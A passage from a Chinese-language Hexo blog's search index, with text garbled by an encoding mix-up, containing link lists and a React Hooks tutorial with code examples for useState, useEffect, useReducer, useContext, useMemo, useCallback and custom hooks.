LeanCloudï¼Œä¸¤è€…æœ‰å†²çªã€‚å¦‚æœæƒ³åŒæ—¶ä½¿ç”¨è¯„è®ºå’Œç»Ÿè®¡åŠŸèƒ½ï¼Œè§£å†³çš„åŠæ³•æ˜¯ï¼šåŸºäº LeanCloud å¼€å¯ valine è¯„è®ºï¼ŒåŸºäºä¸è’œå­å¼€å¯æ–‡ç« ç»Ÿè®¡åŠŸèƒ½ã€‚ å‚è€ƒæ–‡ç«  æ‰‹æŠŠæ‰‹æ•™ä½ ä½¿ç”¨ Hexo + Github Pages æ­å»ºä¸ªäººç‹¬ç«‹åšå®¢ Hexo æ­å»ºçš„ GitHub åšå®¢ä¹‹ä¼˜åŒ–å¤§å…¨ hexo åšå®¢è§£å†³ä¸è’œå­ç»Ÿè®¡æ— æ³•æ˜¾ç¤ºé—®é¢˜ Hexo åšå®¢ä½¿ç”¨ valine è¯„è®ºç³»ç»Ÿæ— æ•ˆæœåŠç»ˆæè§£å†³æ–¹æ¡ˆ]]></content>
      <categories>
        <category>å…¶ä»–</category>
      </categories>
      <tags>
        <tag>å…¶ä»–</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WebAssembly ä¼ é€é—¨]]></title>
    <url>%2F2019%2F08%2F15%2FWebAssembly%2FWebAssembly%20%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99%E4%BC%A0%E9%80%81%E9%97%A8%2F</url>
    <content type="text"><![CDATA[Webç«¯H.265æ’­æ”¾å™¨ç ”å‘è§£å¯†: https://mp.weixin.qq.com/s/ajLFM8q-4-2hxj-M_ChGdg]]></content>
      <categories>
        <category>WebAssembly</category>
      </categories>
      <tags>
        <tag>WebAssembly</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python ä¼ é€é—¨]]></title>
    <url>%2F2019%2F08%2F15%2FPython%2FPython%20%E4%BC%A0%E9%80%81%E9%97%A8%2F</url>
    <content type="text"><![CDATA[åŸºç¡€è¯­æ³• Python å®˜ç½‘ Python tutorial Python Cookbook Python ä»æ–°æ‰‹åˆ°å¤§å¸ˆ github èµ„æ–™ æ•°æ®åˆ†æoj pythontip]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[React Hooks]]></title>
    <url>%2F2019%2F08%2F15%2FWeb%E5%89%8D%E7%AB%AF%2FReact%20Hooks%2F</url>
    <content type="text"><![CDATA[WhatReact v16.7.0-alpha ä¸­ç¬¬ä¸€æ¬¡å¼•å…¥äº† Hooks çš„æ¦‚å¿µï¼Œåœ¨ v16.8.0 ç‰ˆæœ¬æ­£å¼å‘å¸ƒ React Hooks ï¼Œå…¶å¸¦æ¥çš„æœ€å¤§çš„å˜åŒ–åœ¨äºç»™äºˆäº†Function Component (å‡½æ•°å¼ç»„ä»¶)ç±»ä¼¼ç»„ä»¶ç”Ÿå‘½å‘¨æœŸçš„æ¦‚å¿µï¼Œæ‰©å¤§äº† Function Component çš„åº”ç”¨èŒƒå›´ã€‚ ç›®å‰ Function Component åŸºæœ¬å±äº dump ç»„ä»¶ï¼ŒHooks çš„å‡ºç°ä½¿å¾— Function Component æœ‰äº†è‡ªå·±çš„çŠ¶æ€ä¸ä¸šåŠ¡é€»è¾‘ï¼Œç®€å•é€»è¾‘åœ¨è‡ªå·±å†…éƒ¨å¤„ç†å³å¯ï¼Œä¸å†éœ€è¦é€šè¿‡ Props çš„ä¼ é€’ï¼Œä½¿ç®€å•é€»è¾‘ç»„ä»¶æŠ½ç¦»æ›´åŠ æ–¹ä¾¿ï¼Œä¹Ÿä½¿ä½¿ç”¨è€…æ— éœ€å…³å¿ƒç»„ä»¶å†…éƒ¨çš„é€»è¾‘ï¼Œåªå…³å¿ƒ Hooks ç»„ä»¶è¿”å›çš„ç»“æœå³å¯ã€‚ å®˜æ–¹æä¾›çš„ Hooksï¼š åŸºæœ¬ï¼šuseState ã€useEffect ã€ useContext é¢å¤–ï¼šuseCallback ã€ useReducer ã€ useMemo ã€ useRef ã€ useLayoutEffectã€ useImperativeHandle ã€ useDebugValue ä½¿ç”¨æ¡ä»¶ ä»…ä» React åŠŸèƒ½ç»„ä»¶è°ƒç”¨ hooksï¼Œä¸è¦ä»å¸¸è§„ js å‡½æ•°ä¸­è°ƒç”¨ hooksã€‚ åªèƒ½åœ¨é¡¶å±‚è°ƒç”¨ï¼Œä¸èƒ½åœ¨ for å¾ªç¯ã€if æ¡ä»¶åˆ¤æ–­ã€ *å‡½æ•°åµŒå¥— *ä¸­ä½¿ç”¨ã€‚ï¼ˆPsï¼šReact Hooks: ä¸æ˜¯é­”æ³•åªæ˜¯æ•°ç»„ ä¸€æ–‡ä¸­æœ‰è§£é‡Šä¸ºä»€ä¹ˆ hooks åªèƒ½åœ¨é¡¶å±‚è°ƒç”¨ã€‚ï¼‰ Why React Hooks ä¸»è¦è§£å†³ä»¥ä¸‹ä¸‰ä¸ªä¸»è¦çš„é—®é¢˜ï¼š ä»£ç é‡ç”¨ï¼šåœ¨ Hooks å‡ºæ¥ä¹‹å‰ï¼Œå¸¸è§çš„ä»£ç é‡ç”¨æ–¹å¼æ˜¯ HOC å’Œ render propsï¼Œè¿™ä¸¤ç§æ–¹å¼å¸¦æ¥çš„é—®é¢˜æ˜¯ï¼š ä½ éœ€è¦è§£æ„è‡ªå·±çš„ç»„ä»¶ï¼Œéå¸¸çš„ç¬¨é‡ï¼ŒåŒæ—¶ä¼šå¸¦æ¥å¾ˆæ·±çš„ç»„ä»¶åµŒå¥—ã€‚ éš¾ä»¥é‡ç”¨å’Œå…±äº«ç»„ä»¶ä¸­çš„ä¸çŠ¶æ€ç›¸å…³çš„é€»è¾‘ï¼Œé€ æˆäº§ç”Ÿå¾ˆå¤šå·¨å¤§çš„ç»„ä»¶ã€‚ å¤æ‚çš„ç»„ä»¶é€»è¾‘ï¼šåœ¨ class ç»„ä»¶ä¸­ï¼Œæœ‰è®¸å¤šçš„ lifecycle å‡½æ•°ï¼Œå½“æˆ‘ä»¬çš„ç»„ä»¶éœ€è¦å¤„ç†å¤šä¸ªäº’ä¸ç›¸å…³çš„ local state æ—¶ï¼Œæ¯ä¸ªç”Ÿå‘½å‘¨æœŸå‡½æ•°ä¸­å¯èƒ½ä¼šåŒ…å«ç€å„ç§äº’ä¸ç›¸å…³çš„é€»è¾‘åœ¨é‡Œé¢ï¼Œæœ€ç»ˆå¯¼è‡´é€»è¾‘å¤æ‚çš„ç»„ä»¶éš¾ä»¥å¼€å‘ä¸ç»´æŠ¤ã€‚ class ç»„ä»¶çš„å›°æƒ‘ï¼š å¤æ‚çš„æ¨¡å¼ï¼Œå¦‚æ¸²æŸ“é“å…·å’Œé«˜é˜¶ç»„ä»¶ã€‚ ç”±äºä¸šåŠ¡å˜åŠ¨ï¼Œå‡½æ•°ç»„ä»¶ä¸å¾—ä¸æ”¹ä¸ºç±»ç»„ä»¶ å…·ä½“å¯ä»¥å‚è€ƒå®˜æ–¹æ–‡æ¡£ä¸­å¯¹ Hooks å¼•å…¥ åŠ¨æœº çš„è§£é‡Šï¼Œå¦å¤–è¿˜å¯ä»¥å‚è€ƒä¸€ä¸‹çŸ¥ä¹ä¸Šå¦‚ä½•è¯„ä»· React v16.7.0-alpha æå‡ºçš„ Hooks APIï¼Ÿ è¿™ä¸ªé—®é¢˜ç½‘å‹çš„å›ç­”ã€‚ HowuseState useState(0) è¿”å›æ˜¯ä¸ªæ•°ç»„å½¢å¼ï¼ŒuseState(0) ä»£è¡¨ count çš„åˆå§‹å€¼æ˜¯ 0ï¼ŒuseState ç°é˜¶æ®µåªèƒ½ä¼ å…¥ä¸€ä¸ªåˆå§‹å€¼ã€‚useState ç±»ä¼¼ setStateï¼Œä½ å¯ä»¥çœ‹åšæ˜¯å¼‚æ­¥çš„ï¼Œä½† useState å¿…é¡»ä¿è¯æ‰§è¡Œé¡ºåºä¸€ä¸€è‡´ï¼ŒReact ä¸ºæ¯ä¸€æ¬¡çš„ useState è°ƒç”¨åˆ†é…ä¸€ä¸ªç©ºé—´ï¼Œé€šè¿‡ useState è°ƒç”¨é¡ºåºè¾¨åˆ«å„ä¸ªç©ºé—´ã€‚ 12345678910const Counter = () =&gt; &#123; const [count, setCount] = useState(0); const increment = () =&gt; setCount(count + 1); return ( &lt;&gt; &lt;h1&gt;&#123;count&#125;&lt;/h1&gt; &lt;button onClick=&#123;increment&#125;&gt;+&lt;/button&gt; &lt;/&gt; )&#125; useEffect å¦‚æœæˆ‘ä»¬éœ€è¦åœ¨ä¸€äº›ç‰¹å®šçš„ç”Ÿå‘½å‘¨æœŸæˆ–è€…å€¼å˜åŒ–ååšä¸€äº›æ“ä½œçš„è¯ï¼Œå¿…é¡»å€ŸåŠ© useEffect çš„ä¸€äº›ç‰¹æ€§å»å®ç°ã€‚ useState äº§ç”Ÿçš„ changeState æ–¹æ³•å¹¶æ²¡æœ‰æä¾›ç±»ä¼¼äº setState çš„ç¬¬äºŒä¸ªå‚æ•°ä¸€æ ·çš„åŠŸèƒ½ï¼Œå› æ­¤å¦‚æœéœ€è¦åœ¨ State æ”¹å˜åæ‰§è¡Œä¸€äº›æ–¹æ³•ï¼Œå¿…é¡»é€šè¿‡ useEffect å®ç°ã€‚ è¯¥é’©å­æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå‰¯ä½œç”¨éœ€è¦æ‰§è¡Œçš„å›è°ƒï¼Œç”Ÿæˆçš„å›è°ƒæ–¹æ³•å¯ä»¥è¿”å›ä¸€ä¸ªå‡½æ•°ï¼ˆå°†åœ¨ç»„ä»¶å¸è½½æ—¶è¿è¡Œï¼‰ï¼›ç¬¬äºŒä¸ªä¸ºè¯¥å‰¯ä½œç”¨ç›‘å¬çš„çŠ¶æ€æ•°ç»„ï¼Œå½“å¯¹åº”çŠ¶æ€å‘ç”Ÿå˜åŠ¨æ—¶ä¼šæ‰§è¡Œå‰¯ä½œç”¨ï¼Œå¦‚æœç¬¬äºŒä¸ªå‚æ•°ä¸ºç©ºï¼Œé‚£ä¹ˆåœ¨æ¯ä¸€ä¸ª State å˜åŒ–æ—¶éƒ½ä¼šæ‰§è¡Œè¯¥å‰¯ä½œç”¨ã€‚ ä½¿ç”¨ useEffect å®ç°ç±»ç»„ä»¶ä¸­ç”Ÿå‘½å‘¨æœŸï¼š useEffect å¦‚æœç¬¬äºŒä¸ªå‚æ•°æ•°ç»„ä¸­çš„æˆå‘˜å˜é‡ä¸ºç©ºï¼Œåˆ™è¡¨ç¤ºä¸è¯¥å‰¯ä½œç”¨ç›¸å…³è”çš„çŠ¶æ€ä¸ºç©ºï¼Œä¸ç®¡å…¶ä»–çŠ¶æ€å¦‚ä½•å˜åŠ¨ï¼Œè¯¥å‰¯ä½œç”¨éƒ½ä¸ä¼šå†æ¬¡æ‰§è¡Œï¼Œå³å®ç°äº† effect åªä¼šåœ¨ç»„ä»¶ componentDidMount å’Œ componentWillUnmout æ—¶æœŸæ‰§è¡Œã€‚ 123useEffect(() =&gt; &#123; // æ¯æ¬¡componentDidMountä¼šè°ƒç”¨è¿™é‡Œ&#125;,[]) å¦‚æœéœ€è¦åœ¨ componentWillUnmount éœ€è¦æ‰§è¡Œä¸€äº›äº‹ä»¶ï¼Œå¯ä»¥ return è¿”å›æ—¶å€™è¿›è¡Œæ“ä½œã€‚ 123456useEffect(() =&gt; &#123; //åªæœ‰componentDidMountæ—¶å€™è°ƒç”¨è¿™é‡Œ return () =&gt; &#123; // componentWillUnmount &#125;;&#125;, []) useEffect æ¨¡æ‹Ÿ componentDidpdateï¼Œè¯¥ç”Ÿå‘½å‘¨æœŸåœ¨æ¯æ¬¡é¡µé¢æ›´æ–°åéƒ½ä¼šè¢«è°ƒç”¨ï¼Œé‚£ä¹ˆå¯ä»¥åˆ©ç”¨ useEffect å¦‚æœç¬¬äºŒä¸ªå‚æ•°ä¸ºç©ºï¼Œé‚£ä¹ˆåœ¨æ¯ä¸€ä¸ª State å˜åŒ–æ—¶éƒ½ä¼šæ‰§è¡Œè¯¥å‰¯ä½œç”¨çš„ç‰¹æ€§ã€‚ 12345678const mounted = useRef();useEffect(() =&gt; &#123; if(!mounted.current)&#123; mounted.current = true; &#125; else &#123; // æ‰§è¡Œ componentDidpdate &#125;&#125;) useLayoutEffectå¦‚æœå‰¯ä½œç”¨æ˜¯è·Ÿ DOM ç›¸å…³çš„ï¼Œéœ€è¦ä½¿ç”¨ useLayoutEffectã€‚useLayoutEffect ä¸­çš„å‰¯ä½œç”¨ä¼šåœ¨ DOM æ›´æ–°ä¹‹ååŒæ­¥æ‰§è¡Œã€‚ 1234567891011121314function App() &#123; const [width, setWidth] = useState(0); useLayoutEffect(() =&gt; &#123; const title = document.querySelector(&apos;#title&apos;); const titleWidth = title.getBoundingClientRect().width; if (width !== titleWidth) &#123; setWidth(titleWidth); &#125; &#125;); return &lt;div&gt; &lt;h1 id=&quot;title&quot;&gt;hello&lt;/h1&gt; &lt;h2&gt;&#123;width&#125;&lt;/h2&gt; &lt;/div&gt;&#125; useReduceruseReducer æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯ reducer å‡½æ•°ï¼Œè·Ÿ redux ä¸­çš„ reducer æ˜¯ä¸€æ ·çš„ï¼›å¦å¤–ä¸€ä¸ªæ˜¯åˆå§‹çš„çŠ¶æ€å€¼ã€‚è¿”å›çš„æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯çŠ¶æ€å€¼ï¼Œç¬¬äºŒä¸ªå…ƒç´ æ˜¯ dispatch å‡½æ•°ã€‚ 12345678910111213141516171819202122const reducer = (state, action) =&gt; &#123; switch(action.type) &#123; case &apos;increment&apos;: return &#123;count: state.count + 1&#125;; case &apos;decrement&apos;: return &#123;count: state.count - 1&#125;; case &apos;reset&apos;: return initState; default: return state; &#125;&#125;;function App() &#123; const [state, dispatch] = useReducer(reducer, initState); return &lt;div&gt; &lt;h1&gt;&#123;state.count&#125;&lt;/h1&gt; &lt;button onClick=&#123;() =&gt; dispatch(&#123;type: &apos;increment&apos;&#125;)&#125;&gt;+&lt;/button&gt; &lt;button onClick=&#123;() =&gt; dispatch(&#123;type: &apos;decrement&apos;&#125;)&#125;&gt;-&lt;/button&gt; &lt;button onClick=&#123;() =&gt; dispatch(&#123;type: &apos;reset&apos;&#125;)&#125;&gt;reset&lt;/button&gt; &lt;/div&gt;&#125; useRefuseRefï¼šåœ¨å‡½æ•°ç»„ä»¶ä¸­è·å–ç»„ä»¶æˆ–DOMèŠ‚ç‚¹çš„å¼•ç”¨ã€‚ 12345678function App() &#123; const inputRef = useRef(null); return &lt;div&gt; &lt;input type=&quot;text&quot; ref=&#123;inputRef&#125;/&gt; &lt;button onClick=&#123;() =&gt; inputRef.current.focus()&#125;&gt;focus&lt;/button&gt; &lt;/div&gt;&#125; æ³¨ï¼šuseRef å°½é‡å°‘ç”¨ï¼Œå¤§é‡ Mutable çš„æ•°æ®ä¼šå½±å“ä»£ç çš„å¯ç»´æŠ¤æ€§ã€‚ä½†å¯¹äºä¸éœ€é‡å¤åˆå§‹åŒ–çš„å¯¹è±¡æ¨èä½¿ç”¨ useRef å­˜å‚¨ï¼Œæ¯”å¦‚ new G2() ã€‚ useContextã€useReducerContext çš„ä½œç”¨å°±æ˜¯å¯¹å®ƒæ‰€åŒ…å«çš„ç»„ä»¶æ ‘æä¾›å…¨å±€å…±äº«æ•°æ®çš„ä¸€ç§æŠ€æœ¯ã€‚useReducer ç»“åˆ useContextï¼Œé€šè¿‡ context æŠŠ dispatch å‡½æ•°æä¾›ç»™ç»„ä»¶æ ‘ä¸­çš„æ‰€æœ‰ç»„ä»¶ä½¿ç”¨ ï¼Œè€Œä¸ç”¨é€šè¿‡ props æ·»åŠ å›è°ƒå‡½æ•°çš„æ–¹å¼ä¸€å±‚å±‚ä¼ é€’ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475// å®šä¹‰åˆå§‹åŒ–å€¼const initState = &#123; name: &apos;&apos;, pwd: &apos;&apos;, isLoading: false, error: &apos;&apos;, isLoggedIn: false,&#125;// å®šä¹‰state[ä¸šåŠ¡]å¤„ç†é€»è¾‘ reducerå‡½æ•°function loginReducer(state, action) &#123; switch(action.type) &#123; case &apos;login&apos;: return &#123; ...state, isLoading: true, error: &apos;&apos;, &#125; case &apos;success&apos;: return &#123; ...state, isLoggedIn: true, isLoading: false, &#125; case &apos;error&apos;: return &#123; ...state, error: action.payload.error, name: &apos;&apos;, pwd: &apos;&apos;, isLoading: false, &#125; default: return state; &#125;&#125;// å®šä¹‰ contextå‡½æ•°const LoginContext = React.createContext();function LoginPage() &#123; const [state, dispatch] = useReducer(loginReducer, initState); const &#123; name, pwd, isLoading, error, isLoggedIn &#125; = state; const login = (event) =&gt; &#123; event.preventDefault(); dispatch(&#123; type: &apos;login&apos; &#125;); login(&#123; name, pwd &#125;) .then(() =&gt; &#123; dispatch(&#123; type: &apos;success&apos; &#125;); &#125;) .catch((error) =&gt; &#123; dispatch(&#123; type: &apos;error&apos; payload: &#123; error: error.message &#125; &#125;); &#125;); &#125; // åˆ©ç”¨ context å…±äº«dispatch return ( &lt;LoginContext.Provider value=&#123;dispatch&#125;&gt; &lt;...&gt; &lt;LoginButton /&gt; &lt;/LoginContext.Provider&gt; )&#125;function LoginButton() &#123; // å­ç»„ä»¶ä¸­ç›´æ¥é€šè¿‡contextæ‹¿åˆ°dispatchï¼Œå‡ºå‘reduceræ“ä½œstate const dispatch = useContext(LoginContext); const click = () =&gt; &#123; if (error) &#123; // å­ç»„ä»¶å¯ä»¥ç›´æ¥ dispatch action dispatch(&#123; type: &apos;error&apos; payload: &#123; error: error.message &#125; &#125;); &#125; &#125;&#125; æ³¨ï¼šå±€éƒ¨çŠ¶æ€ä¸æ¨èä½¿ç”¨ useReducer ï¼Œä¼šå¯¼è‡´å‡½æ•°å†…éƒ¨çŠ¶æ€è¿‡äºå¤æ‚ï¼Œéš¾ä»¥é˜…è¯»ã€‚ useReducer å»ºè®®åœ¨å¤šç»„ä»¶é—´é€šä¿¡æ—¶ï¼Œç»“åˆ useContext ä¸€èµ·ä½¿ç”¨ã€‚ å‚è€ƒ react-redux useMemoå½“çŠ¶æ€å‘ç”Ÿå˜åŒ–æ—¶ï¼Œæ²¡æœ‰è®¾ç½®å…³è”çŠ¶æ€çš„ useEffect ä¼šå…¨éƒ¨æ‰§è¡Œã€‚åŒæ ·çš„ï¼Œé€šè¿‡è®¡ç®—å‡ºæ¥çš„å€¼æˆ–è€…å¼•å…¥çš„ç»„ä»¶ä¹Ÿä¼šé‡æ–°è®¡ç®—/æŒ‚è½½ä¸€éï¼Œå³ä½¿ä¸å…¶å…³è”çš„çŠ¶æ€æ²¡æœ‰å‘ç”Ÿä»»ä½•å˜åŒ–ã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå¼•å…¥äº† useMemo æ¥å®ç°ç±»ç»„ä»¶ä¸­ shouldComponetUpdate çš„æ€§èƒ½ä¼˜åŒ–ã€‚ useMemo æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºä¸€ä¸ª Getter æ–¹æ³•ï¼Œè¿”å›å€¼ä¸ºè¦ç¼“å­˜çš„æ•°æ®æˆ–ç»„ä»¶ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºè¯¥è¿”å›å€¼ç›¸å…³è”çš„çŠ¶æ€ï¼Œå½“å…¶ä¸­ä»»ä½•ä¸€ä¸ªçŠ¶æ€å‘ç”Ÿå˜åŒ–æ—¶å°±ä¼šé‡æ–°è°ƒç”¨ Getter æ–¹æ³•ç”Ÿæˆæ–°çš„è¿”å›å€¼ã€‚ 12345678910111213141516171819import React, &#123; useState, useMemo &#125; from &apos;react&apos;;import &#123; message &#125; from &apos;antd&apos;;export default function HookDemo() &#123; const [count1, changeCount1] = useState(0); const [count2, changeCount2] = useState(10); const calculateCount = useMemo(() =&gt; &#123; message.info(&apos;é‡æ–°ç”Ÿæˆè®¡ç®—ç»“æœ&apos;); return count1 * 10; &#125;, [count1]); return ( &lt;div&gt; &#123;calculateCount&#125; &lt;button onClick=&#123;() =&gt; &#123; changeCount1(count1 + 1); &#125;&#125;&gt;æ”¹å˜count1&lt;/button&gt; &lt;button onClick=&#123;() =&gt; &#123; changeCount2(count2 + 1); &#125;&#125;&gt;æ”¹å˜count2&lt;/button&gt; &lt;/div&gt; );&#125; useCallbackuseCallback ç”¨æˆ·ç”Ÿæˆ Callback ï¼Œé…åˆuseEffect ä½¿ç”¨ï¼ŒæŠ½ç¦»ä¸åŒ useEffect ä¸­å­˜åœ¨çš„ç›¸åŒé€»è¾‘çš„å°è£…ï¼Œå‡å°‘ä»£ç å†—ä½™ã€‚ useCallback çš„ä½¿ç”¨æ–¹æ³•å’Œ useEffect ä¸€è‡´ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºç”Ÿæˆçš„å›è°ƒæ–¹æ³•ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºè¯¥æ–¹æ³•å…³è”çš„çŠ¶æ€ï¼Œä»»ä¸€çŠ¶æ€å‘ç”Ÿå˜åŠ¨éƒ½ä¼šé‡æ–°ç”Ÿæˆæ–°çš„å›è°ƒã€‚ 1234567891011121314const [count1, changeCount1] = useState(0);const [count2, changeCount2] = useState(10);const calculateCount = useCallback(() =&gt; &#123; if (count1 &amp;&amp; count2) &#123; return count1 * count2; &#125; return count1 + count2;&#125;, [count1, count2])useEffect(() =&gt; &#123; const result = calculateCount(count, count2); message.info(`æ‰§è¡Œå‰¯ä½œç”¨ï¼Œæœ€æ–°å€¼ä¸º$&#123;result&#125;`);&#125;, [calculateCount]) Custom Hooksä¸¾ä¸ªğŸŒ°ï¼Œè‡ªå®šä¹‰ç›‘å¬çª—å£å¤§å°ç»„ä»¶ï¼š 12345678// ä¸€ä¸ªæ˜¾ç¤ºç›®å‰çª—å£å¤§å°çš„ç»„ä»¶function responsiveComponent()&#123; // custom hooks const width = useWindowWidth(); return ( &lt;p&gt;å½“å‰çª—å£çš„å®½åº¦æ˜¯ &#123;width&#125;&lt;/p&gt; )&#125; è‡ªå®šä¹‰ useWindowWidthï¼Œ çª—å£è°ƒæ•´å¤§å°æ—¶ä½¿ç”¨å‰¯ä½œç”¨æ¥è®¾ç½®çŠ¶æ€ï¼š 1234567891011121314import &#123; useState, useEffect&#125; from &apos;react&apos;;// custom hooks to listen window width changefunction useWindowWidth()&#123; const [width, setWidth] = useState(window.innerWidth); useEffect(() =&gt; &#123; const handleResize = ()=&gt;&#123; setWidth(window.innerWidth); &#125; window.addEventListener(&apos;resize&apos;, handleResize); &#125;, [width]); // width æ²¡æœ‰å˜åŒ–åˆ™ä¸å¤„ç† return width;&#125; æ³¨ï¼š custom hooks è¿˜å¯ä»¥å‚è€ƒä¸€ä¸ªæœ‰æ„æ€çš„ hooks åº“ react-useã€‚ åŸç†useState åº•å±‚å®ç° React Hooks: ä¸æ˜¯é­”æ³•ï¼Œåªæ˜¯æ•°ç»„ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354let state = [];let setters = [];let firstRun = true;let cursor = 0;function createSetter(cursor) &#123; return function setterWithCursor(newVal) &#123; state[cursor] = newVal; &#125;;&#125;// This is the pseudocode for the useState helperexport function useState(initVal) &#123; if (firstRun) &#123; state.push(initVal); setters.push(createSetter(cursor)); firstRun = false; &#125; const setter = setters[cursor]; const value = state[cursor]; cursor++; return [value, setter];&#125;// Our component code that uses hooksfunction RenderFunctionComponent() &#123; const [firstName, setFirstName] = useState(&quot;Rudi&quot;); // cursor: 0 const [lastName, setLastName] = useState(&quot;Yardley&quot;); // cursor: 1 return ( &lt;div&gt; &lt;Button onClick=&#123;() =&gt; setFirstName(&quot;Richard&quot;)&#125;&gt;Richard&lt;/Button&gt; &lt;Button onClick=&#123;() =&gt; setFirstName(&quot;Fred&quot;)&#125;&gt;Fred&lt;/Button&gt; &lt;/div&gt; );&#125;// This is sort of simulating Reacts rendering cyclefunction MyComponent() &#123; cursor = 0; // resetting the cursor return &lt;RenderFunctionComponent /&gt;; // render&#125;console.log(state); // Pre-render: []MyComponent();console.log(state); // First-render: [&apos;Rudi&apos;, &apos;Yardley&apos;]MyComponent();console.log(state); // Subsequent-render: [&apos;Rudi&apos;, &apos;Yardley&apos;]// click the &apos;Fred&apos; buttonconsole.log(state); // After-click: [&apos;Fred&apos;, &apos;Yardley&apos;] Hooks ä¸‹çš„æ•°æ®æµç®¡ç† ç¤¾åŒºæœ‰ä¸€ä¸ªéå¸¸è½»é‡çš„åº“ unstate-next ï¼Œå¯ä»¥åšåˆ°ç®¡ç†å…¨å±€çš„ state ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940import React, &#123; useState &#125; from &quot;react&quot;import &#123; createContainer &#125; from &quot;unstated-next&quot;import &#123; render &#125; from &quot;react-dom&quot;function useCounter(initialState = 0) &#123; let [count, setCount] = useState(initialState) let decrement = () =&gt; setCount(count - 1) let increment = () =&gt; setCount(count + 1) return &#123; count, decrement, increment &#125;&#125;let Counter = createContainer(useCounter)function CounterDisplay() &#123; let counter = Counter.useContainer() return ( &lt;div&gt; &lt;button onClick=&#123;counter.decrement&#125;&gt;-&lt;/button&gt; &lt;span&gt;&#123;counter.count&#125;&lt;/span&gt; &lt;button onClick=&#123;counter.increment&#125;&gt;+&lt;/button&gt; &lt;/div&gt; )&#125;function App() &#123; return ( &lt;Counter.Provider&gt; &lt;CounterDisplay /&gt; &lt;Counter.Provider initialState=&#123;2&#125;&gt; &lt;div&gt; &lt;div&gt; &lt;CounterDisplay /&gt; &lt;/div&gt; &lt;/div&gt; &lt;/Counter.Provider&gt; &lt;/Counter.Provider&gt; )&#125;render(&lt;App /&gt;, document.getElementById(&quot;root&quot;)) å‚è€ƒæ–‡ç«  react hooksçš„è¯ç”Ÿ ç†è§£ React Hooks React hooks: ä¸æ˜¯é­”æ³•åªæ˜¯æ•°ç»„ How to fetch data with React Hooks React Hooks æ˜¯ä¸èƒ½æ›¿ä»£ Redux çš„ çœ‹å®Œè¿™ç¯‡ï¼Œä½ ä¹Ÿèƒ½æŠŠ React Hooks ç©å‡ºèŠ± Hooks æ—¶ä»£çš„ React çŠ¶æ€ç®¡ç†æ–¹æ¡ˆ]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
</search>
